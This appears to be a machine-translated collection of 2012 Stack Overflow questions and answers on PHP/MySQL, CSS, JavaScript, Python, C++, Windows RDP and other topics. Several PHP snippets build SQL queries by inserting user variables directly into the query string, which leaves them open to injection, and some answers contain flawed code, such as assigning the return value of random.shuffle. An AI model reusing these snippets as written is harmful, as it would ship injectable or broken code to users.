<iframe width="560" height="315" src="http://www.youtube.com/embed/<asp:Literal ID="keyOfVideo" runat="server"></asp:Literal>" frameborder="0" allowfullscreen></iframe> 
```

代码隐藏：

```
keyOfVideo.Text = "SomeKey"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:04:56.867

您可以为 iframe 添加属性，同时将其设置为在服务器上运行。

```
example = "5CZobYTEwaY";

ex_iframe.Attributes.Add("src", "http://www.youtube.com/embed/" + example); 
```

# php - INSERT INTO 使用 PDO 不插入数据

> ID：11806055
> 
> 赞同：0
> 
> 时间：2012-08-04T05:03:37.840
> 
> 标签：php, pdo

我正在尝试将数据插入指定的数据库，但它不会。我查看了手册尝试的示例以及所有这些，但我无法将数据传递到数据库，但是我可以 echo/print_r/var_dump 它，所以我知道我有数据。这是我的代码：

```
public function insertJson($url, $subId)
    {

        $json_file = file_get_contents(KHAN_BASE.$url.'/videos');
        if(isset($json_file))
        {
            $json_decoded = json_decode($json_file, true);
        }else{
            $this->error = 'A valid JSON file was not specified';
        }

       // var_dump($json_decoded); <--- This return all of the data needed from the json pull so i know I have data

        //m3u8, mp4, png,
        //". $row['m3u8'] .",". $row['mp4'] .",". $row['png'] .",
        foreach($json_decoded as $row)
        {
            //echo $row['backup_timestamp'].'<br/>';  <--- This outputs the correct information so I know I can access it that way

            $sql = "INSERT INTO tbl_khan_videos (sub_subject_id, backup_timestamp, date_added, description,
            duration, extra_properties, has_questions, ka_url, keywords, kind, position, readable_id, relative_url, title, url, views, 
            youtube_id) VALUES (:subid, :backup_timestamp, :date_added, :description, :duration, :extra_properties, :has_questions, :ka_url, :keywords, :kind, :position,
            :readable_id, :relative_url, :title, :url, :views, :youtube_id)";
            $stmt = $this->db->prepare($sql);
                $stmt->bindValue(":subid", $subId);
                $stmt->bindValue(":backup_timestamp",  $row['backup_timestamp']);
                $stmt->bindValue(":date_added", $row['date_added']);
                $stmt->bindValue(":description", $row['description']);
                $stmt->bindValue(":duration", $row['duration']);
                $stmt->bindValue(":extra_properties", $row['extra_properties']);
                $stmt->bindValue(":has_questions", $row['has_questions']);
                $stmt->bindValue(":ka_url", $row['ka_url']);
                $stmt->bindValue(":keywords", $row['keywords']);
                $stmt->bindValue(":kind", $row['kind']);
                $stmt->bindValue(":position", $row['position']);
                $stmt->bindValue(":readable_id", $row['readable_id']);
                $stmt->bindValue(":relative_url", $row['relative_url']);
                $stmt->bindValue(":title", $row['title']);
                $stmt->bindValue(":url", $row['url']);
                $stmt->bindValue(":views", $row['views']);
                $stmt->bindValue(":youtube_id", $row['youtube_id']); 
            $stmt->execute();

        }  
    } 
```

我不确定我做错了什么。我已经尝试将它绑定为一个数组（例如：）`$array = array(':subId' => $subId); $stmt->execute($array);`，但仍然没有数据通过数据库。我知道我的配置`$this->db`很好，因为我可以用它提取其他形式的已经填充的数据。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:02:25.673

我通过这里的一些建议找出了我的问题。发生的事情是我试图绑定空值，因此 bindValue 会导致执行通过而不会产生错误。简单的解决方法是通过带有几个 if 语句的 foreach 循环来执行此操作，这些语句允许我为空字段设置一个值。这解决了错误。再次感谢那些试图设置正确路径以找到解决方案的人。

# html - 如何在 Eclipse 中更改 CSS 和 HTML 的默认设置

> ID：11806057
> 
> 赞同：0
> 
> 时间：2012-08-04T05:03:59.540
> 
> 标签：html, eclipse, css

我使用我的 Eclipse Juno 版本来创建 HTML 和 CSS 文件。当我创建一个新的 HTML 和 CSS 文件时，在 HTML 和 CSS 正常的情况下，它被创建为*HTML 4.01 过渡*，而不是 CSS3。

我尝试从项目属性-Web 内容设置-文档类型-HTML5 和 CSS 配置文件-CSS3 级联样式表级别 3 更改设置，然后应用并确定。

但是，当我返回主工作区时，设置会自动更改并返回默认值、HTML 4.01 过渡和普通 CSS。所以我认为以另一种方式更改默认设置可以帮助我。另外，如果有任何插件可以在 Eclipse 中解决这个问题，请告诉我。

注意我不知道默认的 CSS 版本是什么，所以我使用的是*Normal CSS*。希望理解不会有问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T13:55:11.923

使用 File > New > Other... 然后 Web > HTML file 创建您的 HTML 文件。按照向导直到第三步，您可以在其中选择要使用的 HTML 模板。

# php - MySQL在参数之间选择查询多个，变量不起作用PHP

> ID：11806059
> 
> 赞同：0
> 
> 时间：2012-08-04T05:04:34.877
> 
> 标签：php, mysql, sql

我正在开发一个应用程序，对于给定位置（坐标纬度/经度对），它显示位于给定起始位置的给定半径内的所有实体（从数据库中提取）。

我已经测试过了，我用来查找最近位置的逻辑效果很好。但是，在我与 MySQL 表通信的 PHP 脚本中，我遇到了一个问题。

这是我正在尝试的查询，它没有从表中得到任何结果：

```
$sql = "SELECT * FROM merchants WHERE latitude BETWEEN '$lat1' AND '$lat2' AND longitude BETWEEN '$lon1' AND -90.2745 AND category='$merchCategory'"; 
```

但是，通过回显 $lat1、$lat2、$lon1 和 $lon2，我知道它们包含有效值（应该从查询中产生结果（仅供参考：这 4 个变量表示从给定位置开始的半径平方；**纬度**和**经度**是表中的列。）

```
$lon1= -90.644843447 $lon2= -90.274500553 $lat1= 38.3496784638 $lat2= 38.6395335362 
```

但是，**这**可行（只是对值进行硬编码，而不是使用 $lon2 变量引用它：

```
$sql = "SELECT * FROM cashbackengine_merchants WHERE latitude BETWEEN '$lat1' AND '$lat2' AND longitude BETWEEN '$lon1' AND **-90.2745** AND category='$merchCategory'"; 
```

就像这样：

```
$sql = "SELECT * FROM cashbackengine_merchants WHERE latitude BETWEEN '$lat1' AND '$lat2' AND longitude BETWEEN **-90.64484** AND '$lon2' AND category='$merchCategory'"; 
```

然而，纬度完全没有问题。我强烈认为这与语法有关，并且可能非常简单。任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:09:24.727

尝试这个

```
$sql = "SELECT * FROM merchants WHERE latitude BETWEEN '$lat1' AND '$lat2' AND longitude BETWEEN $lon1 AND $lon2 AND category='$merchCategory'"; 
```

我不确定，但我认为这是因为 BETWEEN 需要两个数字来处理您的情况，并且您将其作为 string 传递`'$lon'`。当您硬编码一个值时，另一个值会自动转换为数字值。

旁注：查看准备好的语句（最好）或转义字符串，因为如果用户正在输入纬度/经度值，这会为您打开 sql 注入。

# matlab - matlab中的simulink模型

> ID：11806062
> 
> 赞同：0
> 
> 时间：2012-08-04T05:04:57.623
> 
> 标签：matlab, simulink

我正在使用 simulink（matlab）中的霍夫变换检测道路车道。我已经设计了模型，但它没有检测到车道。因为我对 simulink 很陌生，所以我不知道我在哪里做错了。我试图上传模型，但它不起作用。我使用了与 matlab-simulink 演示中给出的相同模型，除了我在文件块的图像之后添加了一个新的 rgb2intensity 块，并且我作为输入提供的图像也被上传了[1](http://i.stack.imgur.com/CgJqK.jpg)。任何帮助？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T10:38:57.730

如果没有看到您的实际模型的屏幕截图，很难提供具体细节，但这里有一些您可能会发现有用的一般建议。

我调试 Simulink 模型的方式与调试任何其他代码的方式几乎相同——通过检查每个步骤的输出来尝试准确了解模型*中发生的情况。*

对于初学者，我将使用[To Workspace](http://www.mathworks.com/help/toolbox/simulink/slref/toworkspace.html)块来查看数据在模型中间阶段的实际样子。这将帮助您确定*哪里*出了问题。例如，rgb2intensity 的输出是什么？此功能是否以您期望的方式转换您的数据？如果必须，请询问模型中每个块的问题。如果块的行为不像您期望的那样，那么您可以问*为什么*？

另一个可能对您有用的工具是[Simulink Debugger](http://www.mathworks.com/help/toolbox/simulink/ug/f5-6104.html)。

# android - 在不改变比例的情况下显示图像的最佳选择是什么？

> ID：11806064
> 
> 赞同：0
> 
> 时间：2012-08-04T05:05:12.333
> 
> 标签：android, image, gridview, tablelayout

我想显示来自内容提供商的一些图像。但是，我不想将它们放在 GridView 的正方形中，而是保持它们的比例，如下所示： [https ://www.dropbox.com/s/zeat30ysgq0771p/cameraroll-1343768439.055887.png](https://www.dropbox.com/s/zeat30ysgq0771p/cameraroll-1343768439.055887.png)

我想为一行定义一些高度并用图像填充它直到达到最大宽度。他们我创建一个新行并重新开始。

这样做并保持良好性能的最佳方法是什么？每个 TableRow 内带有 ImageViews 的 TableLayouts？每个 TableRow 内具有唯一行 GridView 的 TableLayouts？网格布局？制作自定义视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:34:33.390

您可以将 ImageView 设置为 wrap_content....所以，根据您的图像大小，它会自动缩放...

# php - 无法通过 PDO PHP 获取存储过程结果集

> ID：11806068
> 
> 赞同：0
> 
> 时间：2012-08-04T05:06:26.403
> 
> 标签：php, mysql, pdo, resultset, procedure

我似乎无法使用 PDO (PHP) 从我的存储过程 (MYSQL) 中获得任何输出。

存储过程：

```
CREATE PROCEDURE getUserId(serviceId VARCHAR(64), serviceInput VARCHAR(32))
BEGIN
    SELECT id FROM users WHERE servid = serviceId AND service = serviceInput;
END 
```

PHP代码：

```
$mysqlConn = mysqlPDOLogin();
$stmt = $mysqlConn->prepare("CALL getUserId(?,?);");
$stmt->bindParam(1, $USERID); 
$stmt->bindParam(2, $USERPROVIDER); 
$stmt->execute();
$returned_a = $stmt->fetch();
echo $returned_a['id']; 
```

它没有得到任何回报。我已经从存储过程中复制了基本的选择代码并直接在 PHP 代码中使用它并且它可以工作，但不能通过存储过程让它工作。

任何帮助，将不胜感激...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:49:16.977

您没有进行任何明显的错误检查。Prepare()、bindParam() 和 execute() 都会通过返回 false 或抛出异常来提醒您错误，具体取决于 PDO 所处的错误报告模式。

我将假设您处于“返回错误”模式。

您需要检查 $stmt 是 PDOStatement 对象，bindParam 语句没有返回 false 并且 execute 没有返回 false。如果其中任何一个发生了，那么您需要使用 errorCode() 和 errorInfo() 来找出问题所在。

此外，对我来说，将存储过程用于基本上是一个简单的查询似乎有些过分。为什么不只做以下事情？

```
$stmt = mysqlConn->prepare ('SELECT id FROM users WHERE servid = ? AND service = ?'); 
```

# php - 查询错误 MySQL php

> ID：11806070
> 
> 赞同：0
> 
> 时间：2012-08-04T05:06:42.970
> 
> 标签：php, mysql

如果没有选择任何内容，但由于某种原因它总是显示一个结果，我是 php 和我的 sql 的新手，试图从该表中获取所有结果。知道为什么

```
$query = "SELECT *, ROUND(AVG(d.rating),0) FROM restaurant AS r, review AS d WHERE 1=1 ";
if($vicinity) $query .= "AND r.vicinity=\"$vicinity\" ";
if($cuisine)  $query .= "AND r.cuisine=\"$cuisine\" ";
if($price)    $query .= "AND r.price=\"$price\"";
if($name)    $query .= "AND r.name LIKE \"%$name%\"";
$result = mysql_query($query);

while($row = mysql_fetch_array($result)) { 
```

我只拿到桌子上的第一项

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:33:19.993

猜测你只会得到一个结果，因为没有 group by 的 avg 调用会触发一些有趣的行为。尝试添加组，我猜您还想将餐厅和评论与加入相关联。例如：

```
$query = "SELECT *, ROUND(AVG(d.rating),0) FROM restaurant AS r LEFT JOIN review AS d on r.id = d.restaurant_id WHERE 1=1";
...
...
$query .= ' GROUP BY r.id';
$result = mysql_query($query); 
```

根据线程，听起来您也应该查看准备好的语句:)。并且`SELECT *`可能也应该只是`SELECT r.*`- 作为评级结果的一部分返回的数据在 group by (r.* 和 round(avg(d.rating),0) 值应该是之后将没有意义)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:17:18.083

尝试使用[准备好的语句](http://php.net/manual/en/pdo.prepared-statements.php)并获取结果并使用迭代器在循环中解析和打印将得到。另请参阅[本教程](http://www.phpeveryday.com/articles/PDO-Prepared-Statement-P550.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:41:11.180

我会亲自研究 PDO。您可以在[此处](http://php.net/manual/en/book.pdo.php)的手册中找到很多相关信息。

# php - 是否可以将表单发送到与网站使用的服务器不同的服务器上的外部脚本文件？

> ID：11806074
> 
> 赞同：0
> 
> 时间：2012-08-04T05:08:05.920
> 
> 标签：php, web-hosting, domain-name

我想知道我是否可以轻松地在我的网站当前使用的服务器之外的另一台服务器上访问我的 PHP 文件。我想这样做，这样我就不必将某些脚本文件提供给我的客户端并让客户端从我自己的服务器访问它们。如果可能的话，我该如何设置我的文件的权限，以便客户可以轻松访问它们。

## 先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:26:13.113

有一种叫做 CSRF [Cross Site Request Forgery](http://en.wikipedia.org/wiki/Cross-site_request_forgery)的东西。它基本上是一种可以防止您刚刚要求的方法：接受来自远程表单的请求。但是，您**想**提供此功能。因此，您可以向您选择的选定用户提供 API，而不是直接接受表单 POST，方法是在向他们提供访问权限之前对其进行身份验证。但是您必须为客户端编写代码，以便他可以使用您的 API。

XML-RPC 也与您想要的*有些相关。*你应该检查一下。

# css - 使用 CSS 构建像小说一样的段落

> ID：11806078
> 
> 赞同：0
> 
> 时间：2012-08-04T05:08:44.780
> 
> 标签：css, wordpress

这是CSS：

```
p + p {
 text-indent: 1.1em;
 margin-top: 0;
}
p {
 font-family: 'Crimson Text', serif;
 margin: 0;
} 
```

HTML：

```
<p>...<p>
<p>...</p> (new paragraph)
<p><br><p>
<p></p> (new scene) 
```

（这是 WordPress 的默认文本编辑器）

我不确定它是如何工作的（我把它从一个我不记得的网站上拿来）。它产生这个：

![在此处输入图像描述](../Images/5d5eb6b9464f35a99a8a075c3d1c0a9c.png)

只有一个问题。第三段是新场景，不应该缩进。我想知道是否有办法用 CSS 解决这个问题？（CSS3 没问题）

**编辑：**

我猜jQuery是唯一的方法？有什么建议用 jQuery 来做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T05:38:04.610

我会说把它组织成场景。

标记：

```
<div class="scene">
    <p>...</p>
    <p>...</p>
    <p>...</p>
</div>
<div class="scene">
    <p>...</p>
    <p>...</p>
    <p>...</p>
</div> 
```

还有一些 CSS：

```
.scene p { text-indent: 1.1em; }
.scene p:first-child { text-indent: 0; } 
```

这可以清理您的标记，并实现全面的一致性。（这也是 ie7/8 友好的）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:22:48.013

这是因为你有所有相邻的段落标签。如果您将 HTML 更改为：

```
<p>...<p>
<p>...</p> (new paragraph)
<br>
<p></p> (new scene) 
```

它应该可以工作 - 如果你想要额外的间距，也许你应该将你的 break 包裹在另一个 div 中？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:29:20.730

您应该使用除 之外的方法来标记场景的变化`<p><br></p>`，这是仅包含换行符的段落。以下内容也是人为的，但即使 CSS 关闭也会导致空行：

```
<p>...</p>
<p>...</p>
<div>&nbsp;</div>
<p>...</p> 
```

这里第三个`p`前面不是`p`元素而是`div`元素，所以选择器`p + p`不适用于它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T05:49:29.920

同意@Jukka K. Korpela，您可能应该使用更好的东西。我从未使用过 word press，但如果您无法更改标记，那么您可能想要更改。

如果你现在只需要它工作，你可以运行这个脚本，它会修复 css 值。

```
$('br').parent('p').next('p').css('text-indent', '0em');​ 
```

您只需要确保`<br/>`在第一个场景之前有标签。

```
<p><br/></p> 
```

[http://jsfiddle.net/bnMzQ/25/](http://jsfiddle.net/bnMzQ/25/)

# windows - Windows 7 Professional 下使用 2 个显示器的 RDP 替代方案

> ID：11806080
> 
> 赞同：1
> 
> 时间：2012-08-04T05:08:58.123
> 
> 标签：windows, rdp

我的工作电脑装有 Windows 7 专业版，我知道我无法使用常规 RDP 来使用 2 台显示器进行连接。

有什么替代方法可以用来通过 RDP 连接到 Windows 7 专业版？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-05T12:21:26.693

只是为了澄清这一点

Windows 7 pro 是客户端时可以使用真正的多显示器（连接服务器2008/windows 7 ult 或企业）

当它是主机（即您要连接的主机）时，它将只允许单个监视器连接到它，跨度选项可以将会话延伸到 2 个屏幕，但它不是真正的多监视器模式

对不起，山姆，但您无法在 tru multimon 模式下连接到 windows 7 pro，您显示的屏幕截图是远程桌面客户端，因此为什么会有这些选项

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-17T19:22:33.197

情况是当Win7 Pro为*主机*（即远程机）时，不提供多显示器支持。

无论您在客户端上使用什么设置，如果主机是 Win7 Pro，您将只能获得一个显示器。时期。

可悲的事实是 Win7 常见问题解答 - 很长一段时间 - 说所有版本的 Win7 通过 RDP 支持多个显示器，没有资格。

在许多用户抱怨使用 Win7 Pro 作为主机失败后，微软通过更改常见问题解答来修复它。坦率地说，微软欠所有 Win7 用户的这个功能，但 Win8 现在是新的（显然，在撰写本文时，失败了）关注焦点。

有一些程序可以修补 Windows Home 以获得完整的 RDP 托管（实际上是 2008 服务器版本，它允许多个远程桌面）。显然它是一个单独的 DLL，并且可能是一些注册表更改。我不知道他们是否会为 Pro 工作，但我猜他们会。

也就是说，如果您有一个 IT 部门管理您的主机 PC，您可能无法做到这一点，并且将花费 130 美元来使用 Anytime 升级到 Ultimate 版本。

尽管事实上在企业中远程连接的压倒性桌面是 Pro。是的，我认为 MS 刚刚发现了一个可能的摇钱树，当然不会承认这一点，也不会兑现他们在很长一段时间内通过常见问题解答做出的承诺。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-08-15T13:27:52.230

Win7确实支持双显示器 WinXP不支持 只要你使用的PC，并且连接的PC是Win7，应该没有问题。此外，您使用 RDP 连接的 PC 必须具有决斗屏幕。如果不是，您必须使用像 Teamviewer 这样的 VNC。见下文 ![在此处输入图像描述](../Images/d982eff59aa46ffc956fc0fea23b9126.png)

# python - python解释器在调用导入函数后返回空白字典

> ID：11806084
> 
> 赞同：2
> 
> 时间：2012-08-04T05:09:53.670
> 
> 标签：python, function, dictionary, import, interpreter

我正在尝试学习python（具有VBA背景）。

我已将以下函数导入到我的解释器中：

```
def shuffle(dict_in_question):  #takes a dictionary as an argument and shuffles it
    shuff_dict = {}
    n = len(dict_in_question.keys())
    for i in range(0, n):
        shuff_dict[i] = pick_item(dict_in_question)
    return shuff_dict 
```

以下是我的口译员的打印件；

```
>>> stuff = {"a":"Dave", "b":"Ben", "c":"Harry"}
>>> stuff
{'a': 'Dave', 'c': 'Harry', 'b': 'Ben'}
>>> decky11.shuffle(stuff)
{0: 'Harry', 1: 'Dave', 2: 'Ben'}
>>> stuff
{}
>>> 
```

看起来字典被打乱了，但在那之后，字典是空的。为什么？或者，我用错了吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:12:08.750

您还需要将其分配回东西，因为您要返回一本新字典。

```
>>> stuff = decky11.shuffle(stuff) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T18:31:50.490

Dogbert 的回答解决了您的直接问题，但请记住，字典没有顺序！没有“my_dict 的第一个元素”这样的东西。（使用 .keys() 或 .values() 会生成一个列表，该列表确实有顺序，但字典本身没有。）因此，谈论“洗牌”字典并没有真正的意义。

All you've actually done here is remapped the keys from letters a, b, c, to integers 0, 1, 2\. These keys have different hash values than the keys you started with, so they print in a different order. But you haven't changed the order of the dictionary, because the dictionary didn't have an order to begin with.

Depending on what you're ultimately using this for (are you iterating over keys?), you can do something more direct:

```
shufflekeys = random.shuffle(stuff.keys())
for key in shufflekeys:
    # do thing that requires order 
```

As a side note, dictionaries (aka hash tables) are a really clever, hyper-useful data structure, which I'd recommend learning deeply if you're not already familiar. A good hash function (and non-pathological data) will give you O(1) (i.e., constant) lookup time - so you can check if a key is in a dictionary of a million items as fast as you can in a dictionary of ten items! The lack of order is a critical feature of a dictionary that enables this speed.

# asp.net-mvc-3 - 如何在 Mvc3 中向下滚动时加载数据库表

> ID：11806086
> 
> 赞同：0
> 
> 时间：2012-08-04T05:09:56.133
> 
> 标签：asp.net-mvc-3, pageload

大家好，我有一个表，它有一个大容量数据和一个显示这些数据的屏幕..我想像这样向用户显示数据

如果用户进入此屏幕，我只需要显示我的数据库的前 20 条记录，当他想查看更多并向下滚动时，应在向下滚动时加载数据，我应该再次向他显示其他 20 条记录我的数据库..所以当他向下滚动页面时应该加载该数据应该填充到页面

我一直在寻找这个，但没有得到我想要的……或者我该怎么做……谁能告诉我我该怎么做……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T14:56:12.107

Rob Conery 写了一篇很棒的[博客](https://stackoverflow.com/questions/11132919/jquery-paging-scroll-in-asp-net-mvc)文章

他使用 JQuery 对他的控制器进行 ajax 调用以加载更多数据。这是他用来加载更多内容的方法：

```
<script type="text/javascript">
    $(window).scroll(function() {
        if ($(window).scrollTop() == $(document).height() - $(window).height()) {
            loadMore();
        }
    });
var current=0;
function loadMore() {

    if (current > -1) {
        current++;

        $('#loading').html("<img src='/content/images/bigloader.gif' />");
        $.get("/archive/index/" + current,
        function(data) {

            if (data != '') {
                $('#results').append(data);
                $('#loading').empty();
            } else {
                current = -1;
                $('#loading').html("<h3><i>-- No more results -- </i></h3>");
            }

        });
    }
}
</script> 
```

# c++ - 为什么浮点类型对于模板函数来说是无效的模板参数类型？

> ID：11806091
> 
> 赞同：2
> 
> 时间：2012-08-04T05:10:39.230
> 
> 标签：c++, floating-point, template-function

我在一个网站上看到声明

```
template <int x>
int func() {
  return x;
} 
```

有效，而以下无效

```
template <double x>
double func() {
  return x;
} 
```

为什么第一个是模板函数的合法声明，而第二个不是？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:15:56.320

它无效，因为它不是整数类型。非类型模板参数有一定的限制，这是其中之一，它说...

> 浮点数和类类型对象不允许作为非类型模板参数。

```
template <double VAT>       // ERROR: floating-point values are not
double process(double v) { // allowed as template parameters
    return v * VAT;
}

template <std::string name> // ERROR: class-type objects are not
class MyClass {             // allowed as template parameters
  /* ... */
}; 
```

以上引自[C++ Templates](http://books.google.com/books?id=yQU-NlmQb_UC&pg=PA40&lpg=PA40&dq=4.3%20Restrictions%20for%20Nontype%20Template%20Parameters&source=bl&ots=EelI25_yE1&sig=3J2keL-N8V9QLAplWem0gLdKAvw&hl=en&sa=X&ei=uLAcUNfHKKyujAKU3IGABA&ved=0CEsQ6AEwAg#v=onepage&q=4.3%20Restrictions%20for%20Nontype%20Template%20Parameters&f=false)。我没有学分。

根据我的理解，它们对模板初始化无效的原因是，像 float 和 double 这样的类型在 C++ 中没有定义的实现。所以当一个模板像

```
template <double VAT> double process(double v); 
```

用两个不同的双精度值初始化为

```
template <(double) 2/3> double process(2.3)

template <(double) 1/3> double process(2.4); 
```

由于双重非类型，它们可能没有相同的位表示，这会使编译器感到困惑。

# ios - 山狮下载和兼容问题

> ID：11806092
> 
> 赞同：0
> 
> 时间：2012-08-04T05:11:03.603
> 
> 标签：ios, xcode

我需要一些关于山狮的确认。

1.  我正在使用雪豹并考虑升级到山狮。现在在下载时，如果互联网连接以某种方式中断，它会再次从头开始还是暂停以便我可以继续？

2.  在下载过程中，我可以使用我的 macbook 吗？

3.  我正在使用 Xcode 4.2 和 ios base sdk 5.0。现在安装山狮后我应该下载哪个 Xcode 版本？

4.  我有一个 ipad sdk 5.1.1。我可以将它用于新的 xcode 版本的设备测试（现在使用我的 ipad 我无法进行设备测试）吗？我在 ner 上搜索了解决方案，但没有一个对我有用。

如果有人知道这些，请告诉我。谢谢你的帮助

萨明

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T05:37:28.787

1.  它确实会暂停，但是，一旦确认稳定的连接，它就会继续（如果我没记错的话，它会自动）。

2.  是的，您的 MacBook 在下载期间完全可用。

3.  安装完成后，您应该正在运行 Xcode 4.4（无需付费开发者帐户即可[在此处](https://developer.apple.com/devcenter/ios/index.action)下载）。如果您有付费帐户，最好下载 Xcode 4.5 Beta 4 以及 iOS 6 SDK。

4.  是的。Xcode 版本 4.3+ 支持 iOS 5.1+。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T05:14:28.150

下载可能会暂停，您可以在下载期间使用 mac，而不是安装，对于 ios 5.1.1 我会下载 ios 6 开发人员预览版 Xcode 以确保兼容性

# iphone - 在 Ipad 中通过 XML Parsing 生成动态控件

> ID：11806099
> 
> 赞同：5
> 
> 时间：2012-08-04T05:12:46.717
> 
> 标签：iphone, ios, ipad, ios5

任何机构帮助我。

我想创建一个动态视图。我想在其中添加动态控件。这些控件来自xml。并且需要在按钮的单击事件中显示在单个视图中。

我的 xml 格式如下所示。

```
 <?xml version="1.0"?><customer><cust type="101"><lable><1> customer name </1><2> customer phone </2><3> customer age </3><4> customer Birth </4></lable><value><1>textfield</1><2> textfield </2><3> textfield </3><4>Date</4></value></cust><cust type="102"><lable><1> customer qualification </1><2> customer Email</2></lable><value><1>textfield</1><2>Email</2></cust><cust type="103"><lable><1> customer name </1><2> customer phone </2><3> customer age </3><4> customer Birth </4></lable><value><1>textfield</1><2>textfield</2><3>textfield</3><4>Date</4></value></cust><cust type="104"><lable><1> customer qualification </1><2> customer Email</2><3> customer gender </3><4> customer Birth </4></lable><value><1>textfield</1><2>textfield</2><3>CheckBox</3><4>Date</4> 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T09:35:44.550

我不知道怎么做，但我认为这可能对你有帮助

[检查这个](https://github.com/jonathanellis/pegasus)

[并阅读视图（苹果文档）](http://developer.apple.com/library/ios/#documentation/WindowsViews/Conceptual/ViewPG_iPhoneOS/WindowsandViews/WindowsandViews.html)

# android - Android上的快速傅立叶逆变换算法

> ID：11806104
> 
> 赞同：0
> 
> 时间：2012-08-04T05:14:02.503
> 
> 标签：android, audio

我在 Android 上使用 AudioRecord 录制音频，读入缓冲区并使用 FFT 算法转换为频率块。现在我可以使用逆 FFT 算法来恢复数据并播放我录制的声音吗？

# javascript - Javascript Hide Div 再次出现

> ID：11806106
> 
> 赞同：0
> 
> 时间：2012-08-04T05:14:07.130
> 
> 标签：javascript, html

我已经设置了一个 div 隐藏在文档单击时具有淡入淡出效果，它在单击任何位置时隐藏，但问题是它在另一次单击时重新出现然后转到隐藏，它不应该在任何另一次单击时重新出现。

我试过这样。

Javascript代码

```
 <script type="text/javascript">
var fired = false;
if(!fired){
document.onclick=function(){close_box_fadeOut()};
delete this.onclick;
}var fired = true;
function close_box(){
    document.getElementById("search-result").style.display="none";
}
function close_box_fadeOut(){
    setOpacity( 100 );
    document.getElementById("search-result").style.display="block";
    fadeOut();
    setTimeout(close_box, 800);
}
function setOpacity( value ) {
 document.getElementById("search-result").style.opacity = value / 10;
 document.getElementById("search-result").style.filter = 'alpha(opacity=' + value * 10 + ')';
}
function fadeOut() {
 for( var i = 0 ; i <= 100 ; i++ ) 
   setTimeout( 'setOpacity(' + (10 - i / 10) + ')' , 8 * i );
}
</script>
enter code here 
```

html代码

```
<div id="search-result"></div> 
```

和CSS代码

```
<style>
  #search-result{
width: 500px;
height: 25px;
background:#069;
border: 5px solid #000;
display: block;
   }
</style> 
```

请查看并建议任何可能的方法来做到这一点。

谢谢

即时搜索代码

```
 function showResult(str)
{
if (str.length==0)
{
document.getElementById("search-result").innerHTML="";
document.getElementById("search-result").style.border="0px";
return;
}
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xmlhttp=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.onreadystatechange=function()
{
if (xmlhttp.readyState==4 && xmlhttp.status==200)
{
document.getElementById("search-result").innerHTML=xmlhttp.responseText;
document.getElementById("search-result").style.border="1px solid #A5ACB2";
document.getElementById("search-result").autocomplete="off";
document.getElementById("search-result").style.display="block";
var fired  = false;
var fade = false;
document.onclick = function(){
close_box_fadeOut();
if(!fade){
document.getElementById("search-input").onmouseenter = function(){
show_box_fadeIn()
delete this.onmouseenter;};
  };
}
document.getElementById("search-input").onmouseleave = function(){
var fade = true;
if(fade){
document.getElementById("search-input").onmouseenter = function(){
show_box()};
 };
}
document.getElementById("search-input").onclick = function(e){
    if(!e) {
    e = window.event;
    }

    if(e.stopPropagation && e.preventDefault) {
    e.stopPropagation();
    e.preventDefault();
    } else {
    e.cancelBubble = true;
    e.returnValue = false;
    }show_box(); return true;
};
}
}
xmlhttp.open("GET","instant-search.php?keyword="+str,true);
xmlhttp.send();
}
function close_box(){
document.getElementById("search-result").style.display="none";
}

function close_box_fadeOut(){
if(fired ){
return;
}
fired = true;
setOpacity( 100 );
document.getElementById("search-result").style.display="block";
fadeOut();
setTimeout(close_box, 800);
}
function show_box(){
document.getElementById("search-result").style.display="block";
}
function show_box_fadeIn(){
setOpacity( 0 );
document.getElementById("search-result").style.display="block";
fadeIn()
}
function setOpacity( value ) {
document.getElementById("search-result").style.opacity = value / 10;
document.getElementById("search-result").style.filter = 'alpha(opacity=' + value * 10 + ')';
}
function fadeIn() {
for( var i = 20 ; i <= 100 ; i++ )
setTimeout( 'setOpacity(' + (i / 5) + ')' , 5 * i );
}
function fadeOut() {
//for( var i = 20 ; i <= 100 ; i++ )
//setTimeout( 'setOpacity(' + (5 - i / 5) + ')' , 5 * i );
for( var i = 0 ; i <= 100 ; i++ ) 
setTimeout( 'setOpacity(' + (10 - i / 10) + ')' , 8 * i );
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T05:18:24.323

只要有点击，注册的函数`document.onclick`就会被调用，无论触发是否为假。您需要检查在您的`close_box_fadeOut()`函数内部或在调用单击函数期间的其他地方是否触发了错误。

例如：

```
function close_box_fadeOut(){
    if(fired){
        return;
    }
    setOpacity( 100 );
    document.getElementById("search-result").style.display="block";
    fadeOut();
    setTimeout(close_box, 800);
} 
```

